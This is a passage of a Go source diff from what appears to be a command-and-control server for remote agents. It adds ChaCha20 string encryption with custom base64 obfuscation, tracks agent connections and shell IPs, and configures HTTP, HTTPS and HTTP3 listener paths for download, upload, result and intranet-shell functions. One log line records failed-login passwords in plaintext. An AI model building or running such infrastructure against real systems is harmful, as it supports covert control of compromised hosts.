+	out := make([]byte, 12+len(cipher))
+	copy(out[:12], nonce[:])
+	copy(out[12:], cipher)
+
+	return out
+}
+
+func chachaDecrypt(input []byte, key []byte) []byte {
+	if len(key) != 32 || len(input) < 12 {
+		return nil
+	}
+
+	var chaKey [32]byte
+	copy(chaKey[:], key)
+
+	var nonce [12]byte
+	copy(nonce[:], input[:12])
+
+	cipher := input[12:]
+	return ChaCha20Encrypt(cipher, chaKey, nonce, 0)
+}
+
+//加密
+func Encrypt(input []byte, key []byte) []byte {
+	if len(input) == 0 || len(key) == 0 {
+		return nil
+	}
+	return chachaEncrypt(input, key)
+}
+//解密
+func Decrypt(input []byte, key []byte) []byte {
+	if len(input) == 0 || len(key) == 0 {
+		return nil
+	}
+	return chachaDecrypt(input, key)
+}
+
 // 字符串解密
-func Get_decry_s(input, key *string, decodeMap map[byte]int) string {
+func Get_decry_s(input *string, key *[]byte, decodeMap map[byte]int) string {
 	data, err := customBase64Decode(*input, decodeMap)
 	if err != nil {
 		return ""
 	}
-	return string(Decrypt(data, []byte(*key)))
+	return string(Decrypt(data, *key))
 }
-
 // 字符串加密
-func Get_encry_s(input, key, base_rounds *string) string {
+func Get_encry_s(input *string, key *[]byte, base_rounds *string) string {
 	return customBase64Encode(
-		Encrypt([]byte(*input), []byte(*key)),
-		*base_rounds,
+		Encrypt(
+			[]byte(*input), 
+			*key),
+			*base_rounds,
 	)
 }
 
@@ -5438,7 +5282,6 @@ type Server struct {
 	ConnPath     string `json:"conn_path"`
 	MsgPath      string `json:"msg_path"`
 	SwitchPath   string `json:"switch_path"`
-	EncryPath    string `json:"encry_path"`
 	DownloadPath string `json:"download_path"`
 	ResultPath   string `json:"result_path"`
 	NetPath      string `json:"net_path"`
@@ -5544,7 +5387,6 @@ var windows_clientMu sync.RWMutex
 type getConn struct {
 	Host       string `json:"host"`
 	OnlineTime string `json:"online_time"`
-	HostKey    string `json:"host_key"`
 	ShellIP    string `json:"shell_ip"`
 	Uid        string `json:"uid"`
 }
@@ -5627,18 +5469,17 @@ func put_innet(uid, target string, shell_innet []string) {
 }
 
 // 写入链接结构体
-func put_conn(host, online_time, uid, shell_ip, host_key string) {
+func put_conn(host, online_time, uid, shell_ip string) {
 	dataConnMu.Lock()
 	newConn := getConn{
 		Host:       host,
 		OnlineTime: online_time,
-		HostKey:    host_key,
 		ShellIP:    shell_ip,
 		Uid:        uid,
 	}
 	for i := range data_conn.Conns {
 		conn := &data_conn.Conns[i]
-		if uid == conn.Uid && host == conn.Host {
+		if uid == conn.Uid {
 			dataConnMu.Unlock()
 			return
 		}
@@ -5655,7 +5496,7 @@ func put_conn(host, online_time, uid, shell_ip, host_key string) {
 type MyServer struct{}
 
 func (s *MyServer) PutServer(
-	port, path, connPath, msgPath, switch_key, encry_key, download, result, net, info,
+	port, path, connPath, msgPath, switch_key, download, result, net, info,
 	upload, list, option, protocol, remark string,
 	certPEM, keyPEM, uid, hostname, keyPart, filekey, windows_pro, base_rounds, resphead, username string,
 ) bool {
@@ -5678,7 +5519,6 @@ func (s *MyServer) PutServer(
 		ConnPath:     connPath,
 		MsgPath:      msgPath,
 		SwitchPath:   switch_key,
-		EncryPath:    encry_key,
 		DownloadPath: download,
 		ResultPath:   result,
 		NetPath:      net,
@@ -5833,7 +5673,7 @@ func readJSONFile(fileName string, v interface{}) error {
 		return fmt.Errorf("could not open file: %v", err)
 	}
 	defer file.Close()
-	byteValue, err := ioutil.ReadAll(file)
+	byteValue, err := io.ReadAll(file)
 	if err != nil {
 		return fmt.Errorf("Failed to read file content: %v", err)
 	}
@@ -5887,7 +5727,7 @@ func ensureConfig(path string) (ServerConfig, error) {
 		if err != nil {
 			return cfg, err
 		}
-		if err := ioutil.WriteFile(path, append(data, '\n'), 0644); err != nil {
+		if err := os.WriteFile(path, append(data, '\n'), 0644); err != nil {
 			return cfg, err
 		}
 		return cfg, nil
@@ -6135,9 +5975,9 @@ func Read_log_word() {
         "request_host": "agent request: IP: %v, Host: %v, UID: %v",
         "login_success": "User login successful, from %v, user: %v",
         "login_fail": "User login failed, from %v, wrong username or password, user: %v, password: %v",
-        "http_server":"[*] Start HTTP server successful, access address :%s%s,Listeners_path:%s,Msg_path:%s,switch_path:%s,key_path:%s,download_path:%s,result_path:%s,net_path:%s,info_path:%s,upload_path:%s,list_path:%s,option:%s",
-        "https_server":"[*] Start HTTPS server successful, access address :%s%s,Listeners_path:%s,Msg_path:%s,switch_path:%s,key_path:%s,download_path:%s,result_path:%s,net_path:%s,info_path:%s,upload_path:%s,list_path:%s,option:%s",
-        "quic_server":"[*] Start HTTP3 server successful, access address :%s%s,Listeners_path:%s,Msg_path:%s,switch_path:%s,key_path:%s,download_path:%s,result_path:%s,net_path:%s,info_path:%s,upload_path:%s,list_path:%s,option:%s",
+        "http_server":"[*] Start HTTP server successful, access address :%s%s,Listeners_path:%s,Msg_path:%s,switch_path:%s,download_path:%s,result_path:%s,net_path:%s,info_path:%s,upload_path:%s,list_path:%s,option:%s",
+        "https_server":"[*] Start HTTPS server successful, access address :%s%s,Listeners_path:%s,Msg_path:%s,switch_path:%s,download_path:%s,result_path:%s,net_path:%s,info_path:%s,upload_path:%s,list_path:%s,option:%s",
+        "quic_server":"[*] Start HTTP3 server successful, access address :%s%s,Listeners_path:%s,Msg_path:%s,switch_path:%s,download_path:%s,result_path:%s,net_path:%s,info_path:%s,upload_path:%s,list_path:%s,option:%s",
         "http_err":"FAIL TO START HTTP SERVER: %v",
         "https_err":"FAIL TO START HTTPS SERVER: %v",
         "quic_err":"FAIL TO START HTTP3 SERVER: %v",
